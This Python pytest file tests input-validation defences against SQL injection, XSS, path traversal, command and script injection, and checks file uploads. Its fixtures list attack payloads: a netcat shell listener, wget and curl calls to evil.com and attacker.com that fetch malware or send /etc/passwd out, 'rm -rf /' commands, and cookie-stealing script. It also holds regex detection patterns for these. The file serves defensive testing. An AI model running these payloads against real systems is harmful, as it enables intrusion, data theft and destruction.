#!/usr/bin/env python3
"""
Input Validation Security Tests

Tests for preventing common injection attacks:
- SQL Injection
- XSS (Cross-Site Scripting)
- Path Traversal
- Command Injection
- Script Injection
"""

import pytest
import tempfile
import os
import sys
from pathlib import Path
from unittest.mock import patch

# Add project root to path
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))


class TestSQLInjectionPrevention:
    """Test SQL injection prevention measures."""
    
    @pytest.fixture
    def malicious_sql_payloads(self):
        """Common SQL injection payloads."""
        return [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT password FROM users --",
            "admin'--",
            "' OR 1=1 #",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "1' OR '1'='1' UNION SELECT * FROM sensitive_data --"
        ]
    
    def test_sql_injection_in_user_input(self, malicious_sql_payloads):
        """Test that user input is properly sanitized against SQL injection."""
        # Mock database query function
        def mock_query(sql, params=None):
            # Simulate parameterized query (safe)
            if params:
                return f"SAFE: {sql} with params {params}"
            # Simulate string concatenation (unsafe)
            return f"UNSAFE: {sql}"
        
        # Test safe parameterized queries
        for payload in malicious_sql_payloads:
            safe_result = mock_query("SELECT * FROM users WHERE name = ?", [payload])
            assert "SAFE" in safe_result
            assert payload not in safe_result or "params" in safe_result
    
    def test_sql_injection_patterns_detection(self, malicious_sql_payloads):
        """Test detection of SQL injection patterns."""
        sql_injection_patterns = [
            r"'.*--",           # Comment injection
            r"'.*OR.*'.*=.*'",  # Boolean-based injection
            r"'.*UNION.*SELECT", # Union-based injection
            r"'.*DROP.*TABLE",   # Destructive injection
            r"'.*INSERT.*INTO"   # Data manipulation injection
        ]
        
        import re
        
        def has_sql_injection_pattern(input_string):
            """Check if input contains SQL injection patterns."""
            for pattern in sql_injection_patterns:
                if re.search(pattern, input_string, re.IGNORECASE):
                    return True
            return False
        
        # All malicious payloads should be detected
        for payload in malicious_sql_payloads:
            assert has_sql_injection_pattern(payload), f"Failed to detect SQL injection in: {payload}"
        
        # Clean inputs should not be flagged
        clean_inputs = ["john_doe", "user123", "test@example.com"]
        for clean_input in clean_inputs:
            assert not has_sql_injection_pattern(clean_input), f"False positive for: {clean_input}"


class TestXSSPrevention:
    """Test XSS (Cross-Site Scripting) prevention measures."""
    
    @pytest.fixture
    def xss_payloads(self):
        """Common XSS payloads."""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<div onclick=alert('XSS')>Click me</div>",
            "';alert('XSS');//",
            "<script>document.cookie='stolen'</script>",
            "<img src=\"x\" onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))\"/>"
        ]
    
    def test_xss_payload_sanitization(self, xss_payloads):
        """Test that XSS payloads are properly sanitized."""
        def sanitize_html(input_string):
            """Basic HTML sanitization (simplified)."""
            import html
            # HTML escape
            escaped = html.escape(input_string)
            # Remove dangerous attributes
            dangerous_attrs = ['onload', 'onerror', 'onclick', 'onmouseover']
            for attr in dangerous_attrs:
                escaped = escaped.replace(attr, 'x-' + attr)
            return escaped
        
        for payload in xss_payloads:
            sanitized = sanitize_html(payload)
            # Check that dangerous elements are escaped or removed
            assert '<script>' not in sanitized.lower()
            assert 'javascript:' not in sanitized.lower()
            assert 'onload=' not in sanitized.lower()
            assert 'onerror=' not in sanitized.lower()
    
    def test_xss_pattern_detection(self, xss_payloads):
        """Test detection of XSS patterns."""
        xss_patterns = [
            r'<script.*?>',
            r'javascript:',
            r'on\w+\s*=',
            r'<iframe.*?>',
            r'<svg.*?>',
            r'alert\s*\(',
            r'eval\s*\('
        ]
        
        import re
        
        def has_xss_pattern(input_string):
            """Check if input contains XSS patterns."""
            for pattern in xss_patterns:
                if re.search(pattern, input_string, re.IGNORECASE):
                    return True
            return False
        
        # All XSS payloads should be detected
        for payload in xss_payloads:
            assert has_xss_pattern(payload), f"Failed to detect XSS in: {payload}"
        
        # Clean inputs should not be flagged
        clean_inputs = ["Hello World", "user@example.com", "normal text content"]
        for clean_input in clean_inputs:
            assert not has_xss_pattern(clean_input), f"False positive for: {clean_input}"


class TestPathTraversalPrevention:
    """Test path traversal attack prevention."""
    
    @pytest.fixture
    def path_traversal_payloads(self):
        """Common path traversal payloads."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....\/....\/....\/etc\/passwd",
            "/etc/passwd%00.jpg",
            "....//....//....//etc//passwd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "../../../../../../etc/shadow"
        ]
    
    def test_path_traversal_detection(self, path_traversal_payloads):
        """Test detection of path traversal patterns."""
        def is_path_traversal_attempt(file_path):
            """Check if path contains traversal patterns."""
            import os
            import urllib.parse
            
            # Decode URL encoding
            decoded_path = urllib.parse.unquote(file_path)
            
            # Normalize path
            normalized = os.path.normpath(decoded_path)
            
            # Check for traversal indicators
            traversal_indicators = [
                '..',
                '%2e%2e',
                '..%2f',
                '..\\',
                '..../',
                '....\\',
                '%00'  # Null byte
            ]
            
            for indicator in traversal_indicators:
                if indicator.lower() in decoded_path.lower():
                    return True
            
            # Check if normalized path goes outside allowed directory
            if normalized.startswith('../') or '/../' in normalized:
                return True
            
            return False
        
        # All path traversal payloads should be detected
        for payload in path_traversal_payloads:
            assert is_path_traversal_attempt(payload), f"Failed to detect path traversal in: {payload}"
        
        # Clean paths should not be flagged
        clean_paths = ["file.txt", "documents/report.pdf", "images/photo.jpg"]
        for clean_path in clean_paths:
            assert not is_path_traversal_attempt(clean_path), f"False positive for: {clean_path}"
    
    def test_safe_file_access(self, path_traversal_payloads):
        """Test safe file access implementation."""
        def safe_file_read(requested_path, base_directory="/tmp/safe"):
            """Safely read file preventing path traversal."""
            import os
            
            # Resolve absolute path
            abs_base = os.path.abspath(base_directory)
            abs_requested = os.path.abspath(os.path.join(base_directory, requested_path))
            
            # Check if requested path is within base directory
            if not abs_requested.startswith(abs_base):
                raise ValueError("Path traversal attempt detected")
            
            return abs_requested
        
        # Test that traversal attempts are blocked
        for payload in path_traversal_payloads:
            with pytest.raises(ValueError, match="Path traversal attempt"):
                safe_file_read(payload)
        
        # Test that safe paths are allowed
        safe_paths = ["file.txt", "subdir/file.txt", "data/report.pdf"]
        for safe_path in safe_paths:
            try:
                result = safe_file_read(safe_path)
                assert "/tmp/safe" in result
            except ValueError:
                pytest.fail(f"Safe path rejected: {safe_path}")


class TestCommandInjectionPrevention:
    """Test command injection prevention measures."""
    
    @pytest.fixture
    def command_injection_payloads(self):
        """Common command injection payloads."""
        return [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& echo 'hacked'",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; nc -l -p 1234 -e /bin/sh",
            "| wget http://evil.com/malware.sh",
            "&& curl http://attacker.com/?data=`cat /etc/passwd`",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
            "|| echo 'command failed but this runs'"
        ]
    
    def test_command_injection_detection(self, command_injection_payloads):
        """Test detection of command injection patterns."""
        def has_command_injection(input_string):
            """Check if input contains command injection patterns."""
            import re
            
            dangerous_patterns = [
                r'[;&|]',           # Command separators
                r'`.*`',            # Backticks
                r'\$\(.*\)',        # Command substitution
                r'>\s*/dev/',       # File redirection
                r'<\s*/dev/',       # File input
                r'\|\s*\w+',        # Pipe to command
                r'&&\s*\w+',        # AND operator
                r'\|\|\s*\w+',      # OR operator
                r'nc\s+-l',         # Netcat listener
                r'rm\s+-rf',        # Destructive remove
                r'wget\s+http',     # Download command
                r'curl\s+http'      # HTTP request
            ]
            
            for pattern in dangerous_patterns:
                if re.search(pattern, input_string, re.IGNORECASE):
                    return True
            return False
        
        # All command injection payloads should be detected
        for payload in command_injection_payloads:
            assert has_command_injection(payload), f"Failed to detect command injection in: {payload}"
        
        # Clean inputs should not be flagged
        clean_inputs = ["filename.txt", "user-data", "report_2023.pdf"]
        for clean_input in clean_inputs:
            assert not has_command_injection(clean_input), f"False positive for: {clean_input}"
    
    @patch('subprocess.run')
    def test_safe_command_execution(self, mock_subprocess, command_injection_payloads):
        """Test safe command execution preventing injection."""
        def safe_command_execution(user_input):
            """Safely execute command with user input."""
            import subprocess
            import shlex
            
            # Validate input first
            if any(char in user_input for char in ';&|`$()<>'):
                raise ValueError("Dangerous characters detected")
            
            # Use shell=False and pass arguments as list
            cmd = ['echo', user_input]
            return subprocess.run(cmd, shell=False, capture_output=True, text=True)
        
        # Test that dangerous inputs are rejected
        for payload in command_injection_payloads:
            with pytest.raises(ValueError, match="Dangerous characters"):
                safe_command_execution(payload)
        
        # Test that safe inputs work
        safe_inputs = ["hello", "world", "test123"]
        for safe_input in safe_inputs:
            try:
                safe_command_execution(safe_input)
                # Verify subprocess.run was called with shell=False
                mock_subprocess.assert_called_with(['echo', safe_input], shell=False, capture_output=True, text=True)
            except ValueError:
                pytest.fail(f"Safe input rejected: {safe_input}")


class TestScriptInjectionPrevention:
    """Test script injection prevention in dynamic code execution."""
    
    @pytest.fixture
    def script_injection_payloads(self):
        """Script injection payloads."""
        return [
            "__import__('os').system('rm -rf /')",
            "eval('__import__(\"os\").system(\"malicious_command\")')",
            "exec('import os; os.system(\"evil\")')",
            "compile('malicious_code', 'string', 'exec')",
            "globals()['__builtins__']['exec']('evil_code')",
            "locals()['__builtins__']['eval']('malicious')",
            "getattr(__builtins__, 'exec')('bad_code')",
            "__import__('subprocess').call(['rm', '-rf', '/'])",
            "open('/etc/passwd').read()",
            "__import__('pickle').loads(malicious_data)"
        ]
    
    def test_eval_exec_prevention(self, script_injection_payloads):
        """Test that eval/exec usage is prevented or secured."""
        def safe_expression_evaluator(expression):
            """Safely evaluate mathematical expressions only."""
            import ast
            import operator
            
            # Define allowed operations
            allowed_ops = {
                ast.Add: operator.add,
                ast.Sub: operator.sub,
                ast.Mult: operator.mul,
                ast.Div: operator.truediv,
                ast.Pow: operator.pow,
                ast.USub: operator.neg,
                ast.UAdd: operator.pos,
            }
            
            def eval_node(node):
                if isinstance(node, ast.Num):
                    return node.n
                elif isinstance(node, ast.BinOp):
                    return allowed_ops[type(node.op)](eval_node(node.left), eval_node(node.right))
                elif isinstance(node, ast.UnaryOp):
                    return allowed_ops[type(node.op)](eval_node(node.operand))
                else:
                    raise ValueError("Unsupported operation")
            
            try:
                tree = ast.parse(expression, mode='eval')
                return eval_node(tree.body)
            except (ValueError, KeyError, SyntaxError):
                raise ValueError("Invalid or unsafe expression")
        
        # Test that script injection payloads are rejected
        for payload in script_injection_payloads:
            with pytest.raises(ValueError):
                safe_expression_evaluator(payload)
        
        # Test that safe mathematical expressions work
        safe_expressions = ["2 + 3", "10 * 5", "100 / 4", "2 ** 3"]
        expected_results = [5, 50, 25.0, 8]
        for expr, expected in zip(safe_expressions, expected_results):
            result = safe_expression_evaluator(expr)
            assert result == expected
    
    def test_dangerous_imports_detection(self, script_injection_payloads):
        """Test detection of dangerous import patterns."""
        def has_dangerous_imports(code_string):
            """Check for dangerous import patterns."""
            import re
            
            dangerous_patterns = [
                r'__import__\s*\(',
                r'import\s+os',
                r'import\s+subprocess',
                r'import\s+sys',
                r'from\s+os\s+import',
                r'eval\s*\(',
                r'exec\s*\(',
                r'compile\s*\(',
                r'globals\s*\(\)',
                r'locals\s*\(\)',
                r'getattr\s*\(',
                r'__builtins__',
                r'pickle\.loads'
            ]
            
            for pattern in dangerous_patterns:
                if re.search(pattern, code_string, re.IGNORECASE):
                    return True
            return False
        
        # All script injection payloads should be detected
        for payload in script_injection_payloads:
            assert has_dangerous_imports(payload), f"Failed to detect dangerous imports in: {payload}"
        
        # Safe code should not be flagged
        safe_code = [
            "x = 1 + 2",
            "name = 'user'",
            "result = math.sqrt(16)",
            "data = json.loads(json_string)"
        ]
        for code in safe_code:
            assert not has_dangerous_imports(code), f"False positive for: {code}"


class TestSecurityHeaderValidation:
    """Test security header validation and enforcement."""
    
    def test_content_type_validation(self):
        """Test Content-Type header validation."""
        def validate_content_type(content_type):
            """Validate Content-Type header."""
            allowed_types = [
                'application/json',
                'text/plain',
                'text/html',
                'application/xml',
                'multipart/form-data',
                'application/x-www-form-urlencoded'
            ]
            
            # Extract base content type (ignore charset, boundary, etc.)
            base_type = content_type.split(';')[0].strip().lower()
            return base_type in allowed_types
        
        # Test valid content types
        valid_types = [
            'application/json',
            'application/json; charset=utf-8',
            'text/plain',
            'text/html; charset=utf-8',
            'multipart/form-data; boundary=something'
        ]
        for content_type in valid_types:
            assert validate_content_type(content_type)
        
        # Test invalid/suspicious content types
        invalid_types = [
            'application/x-msdownload',
            'application/octet-stream',
            'text/javascript',
            'application/x-shockwave-flash',
            'application/x-executable'
        ]
        for content_type in invalid_types:
            assert not validate_content_type(content_type)
    
    def test_file_upload_validation(self):
        """Test file upload security validation."""
        def validate_file_upload(filename, content_type, file_size):
            """Validate file upload security."""
            import os
            
            # Check file extension
            allowed_extensions = {'.txt', '.pdf', '.jpg', '.jpeg', '.png', '.gif', '.doc', '.docx'}
            file_ext = os.path.splitext(filename)[1].lower()
            
            if file_ext not in allowed_extensions:
                return False, "File type not allowed"
            
            # Check for double extensions (e.g., file.pdf.exe)
            if filename.count('.') > 1:
                return False, "Multiple file extensions not allowed"
            
            # Check file size (e.g., max 10MB)
            max_size = 10 * 1024 * 1024  # 10MB
            if file_size > max_size:
                return False, "File too large"
            
            # Check content type matches extension
            type_mapping = {
                '.txt': 'text/plain',
                '.pdf': 'application/pdf',
                '.jpg': 'image/jpeg',
                '.jpeg': 'image/jpeg',
                '.png': 'image/png',
                '.gif': 'image/gif'
            }
            
            expected_type = type_mapping.get(file_ext)
            if expected_type and not content_type.startswith(expected_type):
                return False, "Content type mismatch"
            
            return True, "Valid file"
        
        # Test valid uploads
        valid_uploads = [
            ('document.pdf', 'application/pdf', 1024*1024),
            ('image.jpg', 'image/jpeg', 500*1024),
            ('text.txt', 'text/plain', 1024)
        ]
        for filename, content_type, size in valid_uploads:
            valid, message = validate_file_upload(filename, content_type, size)
            assert valid, f"Valid upload rejected: {message}"
        
        # Test malicious uploads
        malicious_uploads = [
            ('script.exe', 'application/octet-stream', 1024),  # Executable
            ('file.pdf.exe', 'application/pdf', 1024),         # Double extension
            ('huge.jpg', 'image/jpeg', 20*1024*1024),          # Too large
            ('fake.jpg', 'text/plain', 1024)                   # Type mismatch
        ]
        for filename, content_type, size in malicious_uploads:
            valid, message = validate_file_upload(filename, content_type, size)
            assert not valid, f"Malicious upload allowed: {filename}"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])